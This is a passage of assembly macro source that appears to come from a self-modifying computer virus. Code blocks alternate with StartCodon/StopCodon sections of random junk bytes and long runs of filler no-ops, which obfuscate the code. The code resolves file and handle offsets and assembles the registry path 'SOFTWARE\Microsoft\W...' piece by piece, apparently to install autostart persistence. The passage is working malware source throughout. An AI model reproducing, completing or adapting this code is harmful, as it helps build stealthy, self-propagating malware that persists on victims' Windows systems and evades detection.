        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
    _getdata
    _call
    _getDO
db StopCodon
db 240
db 36
db 3
db 136
db 50
db 62
db 81
db 189
db 69
db 23
db 6
db 107
db 255
db 135
db 249
db 250
db 116
db 38
db 231
db 229
db 64
db 153
db 216
db 67
db 39
db 99
db 243
db 117
db 223
db 138
db 65
db 216
db 241
db 54
db 26
db 50
db 36
db 241
db 114
db 224
db 128
db 191
db 21
db 246
db 174
db 133
db 183
db 64
db 90
db 84
db 63
db 108
db 202
db 232
db 138
db 76
db 64
db 200
db 236
db 55
db 103
db 19
db 64
db 62
db 239
db 206
db 85
db 106
db 168
db 185
db 67
db 144
db 8
db 40
db 119
db 191
db 31
db 63
db 180
db 68
db 58
db 156
db 55
db 239
db 17
db 26
db 83
db 125
db 126
db 102
db 191
db 158
db 213
db 46
db 79
db StartCodon
    BigNum=FileHandle-DataOffset
    AlreadyStarted=0
    if BigNum<25
db StopCodon
db 232
db 181
db 82
db 243
db 81
db 245
db 119
db 71
db 121
db 227
db 103
db 211
db 63
db 177
db 252
db 48
db 86
db 25
db 202
db 138
db StartCodon
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 102
db 10
db 219
db 209
db 64
db 253
db 93
db 111
db 1
db 2
db 77
db 194
db 4
db 119
db 72
db 178
db 101
db 121
db 3
db 249
db 1
db 153
db 35
db 104
db 174
db 226
db 128
db 4
db 249
db 202
db 245
db 29
db 239
db 93
db 232
db 104
db 251
db 123
db 188
db 47
db 16
db 192
db 66
db 197
db 67
db 250
db 241
db 114
db 43
db 224
db 21
db 124
db 88
db 187
db 101
db 24
db 163
db 27
db 168
db 25
db 33
db 18
db 211
db 223
db 220
db 250
db 82
db 140
db 31
db 25
db 75
db 247
db 208
db 224
db 175
db 204
db 224
db 122
db 59
db 108
db 31
db 140
db 21
db 89
db 79
db 243
db 165
db 11
db 235
db 198
db 0
db 137
db 198
db 52
db 22
db 46
db 191
db 83
db 219
db 134
db 185
db 97
db 68
db 126
db 214
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata
       _push
    _getDO
    BigNum=hCloseHandle-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
_nopREAL
_nopREAL
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
    _getdata
    _call
    _getDO
    BigNum=AutoStartContentStart-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 58
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
       _nopdA
db StopCodon
db 236
db 236
db 196
db 215
db 113
db 34
db 75
db 32
db 217
db 158
db 69
db 184
db 103
db 12
db 42
db 33
db 41
db 222
db 13
db 234
db 213
db 16
db 178
db 129
db 25
db 46
db 90
db 246
db 224
db 122
db 15
db 55
db 21
db 128
db 106
db 18
db 252
db 159
db 221
db 231
db 158
db 56
db 171
db 163
db 67
db 62
db 137
db 194
db 57
db 190
db 219
db 57
db 80
db 240
db 58
db 133
db 80
db 214
db 38
db 37
db 248
db 6
db 2
db 79
db 223
db 220
db StartCodon
    _getDO
    BigNum=stSubKey-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
db StopCodon
db 230
db 251
db 245
db 147
db 226
db 48
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _nopdA
       _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum='SOFT'
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db 231
db 60
db 205
db 246
db 115
db 235
db 166
db 34
db 112
db 207
db 142
db 220
db 101
db 21
db 102
db 63
db 160
db 95
db 38
db 132
db 85
db 166
db 24
db 211
db 156
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord
       _nopsA
    BigNum=4
    AlreadyStarted=0
    if BigNum<25
db StopCodon
db 198
db 126
db 251
db 8
db 17
db 4
db 158
db 71
db 147
db 120
db 111
db 9
db 205
db StartCodon
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
db StopCodon
db 250
db 131
db 34
db 151
db 83
db 55
db 57
db 68
db 129
db 153
db StartCodon
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
db StopCodon
db 101
db 127
db 130
db 25
db 12
db 215
db 172
db 28
db 242
db 60
db 204
db 61
db 249
db 125
db 137
db 24
db 170
db 2
db 8
db 186
db 226
db 185
db 20
db StartCodon
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _nopdA
       _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum='WARE'
    AlreadyStarted=0
db StopCodon
db 167
db 190
db 131
db 3
db 235
db 220
db 170
db StartCodon
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
db StopCodon
db StartCodon
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
db StopCodon
db 3
db 87
db 184
db 253
db 228
db 19
db 214
db 20
db 244
db 131
db 67
db 89
db 173
db 209
db 248
db 81
db 249
db 10
db 147
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 238
db 24
db 145
db 50
db 46
db 59
db 47
db 179
db 148
db 64
db 136
db 83
db 90
db 42
db 116
db 205
db 75
db 18
db 48
db 217
db 198
db 139
db 22
db 25
db 134
db 74
db 210
db 175
db 82
db 142
db 36
db 204
db 244
db 94
db 211
db 174
db 129
db 163
db 9
db 63
db 62
db 238
db 10
db 207
db 73
db 77
db 214
db 36
db 95
db 49
db 208
db 246
db 52
db 223
db 18
db 112
db 19
db 28
db 26
db 39
db 162
db 176
db 254
db 208
db 62
db 218
db 238
db 51
db 1
db 230
db 35
db 115
db 244
db 197
db 180
db 198
db 188
db 125
db 81
db 148
db 159
db 39
db 191
db 159
db 133
db 92
db 126
db 172
db 187
db 225
db 134
db 229
db 240
db 101
db 172
db 96
db 186
db 241
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 168
db 130
db 208
db 185
db 80
db 104
db 125
db 90
db 134
db 102
db 121
db 66
db 118
db 59
db 167
db 194
db 159
db 130
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord
       _nopsA
    BigNum=4
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
db StopCodon
db 183
db 140
db 16
db 248
db 70
db 216
db 148
db 147
db 6
db 232
db 51
db 190
db 173
db 199
db 218
db 20
db 31
db 186
db 175
db 70
db 71
db 87
db 120
db 31
db 115
db 77
db 15
db 124
db 112
db 31
db 225
db 54
db 100
db 211
db 198
db 25
db 217
db 18
db 100
db StartCodon
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
db StopCodon
db 80
db 195
db 108
db 199
db 119
db 171
db 75
db 141
db 125
db 207
db 110
db 228
db 247
db 139
db 221
db 121
db 124
db 162
db 172
db 191
db 167
db 55
db 32
db 241
db 66
db 187
db 65
db 87
db 252
db 230
db 224
db 10
db 110
db 100
db 223
db 182
db 247
db 228
db 237
db 91
db 243
db 233
db 103
db 170
db 235
db 1
db 167
db 76
db 122
db 75
db 129
db 96
db 118
db 52
db 117
db 230
db 117
db StartCodon
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _nopdA
       _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum='\Mic'
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord
       _nopsA
    BigNum=4
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 98
db 192
db StartCodon
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _nopdA
db StopCodon
db 203
db 166
db 64
db 21
db 122
db 122
db 118
db 234
db 219
db 82
db 118
db 184
db 247
db 148
db 37
db 78
db 163
db 187
db 172
db 61
db 148
db 183
db 180
db 164
db 86
db 192
db 202
db StartCodon
       _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum='roso'
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
db StopCodon
db 73
db 248
db 213
db 241
db 27
db 219
db 151
db 148
db 12
db 95
db 177
db 187
db 6
db 169
db 97
db 196
db 115
db 168
db 136
db 186
db 36
db 1
db 174
db 208
db 18
db 142
db 126
db 46
db 42
db 44
db 170
db 233
db 11
db 111
db 139
db 6
db 6
db 200
db 172
db 97
db 86
db 26
db 190
db 171
db 130
db 156
db 29
db 37
db 201
db 91
db 23
db 0
db 240
db 248
db 62
db 224
db 46
db 64
db 84
db 246
db 60
db 4
db 231
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
db StopCodon
db 27
db 238
db 222
db 19
db 77
db 174
db 120
db 5
db 229
db 164
db 107
db 147
db 142
db 35
db 148
db 184
db 8
db 38
db 106
db 47
db 124
db 195
db 197
db 174
db StartCodon
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord
       _nopsA
    BigNum=4
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 236
db 50
db 254
db 171
db 254
db 96
db 188
db 249
db 159
db 128
db 117
db 120
db 12
db 206
db 143
db 97
db 127
db 223
db 93
db 178
db 97
db 129
db 118
db 177
db 251
db 193
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 229
db 5
db 88
db 238
db 186
db 226
db 65
db 115
db 22
db 45
db 83
db 89
db 201
db 133
db 109
db 6
db 27
db 83
db StartCodon
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _nopdA
       _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum='ft\W'
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 203
db 234
db 216
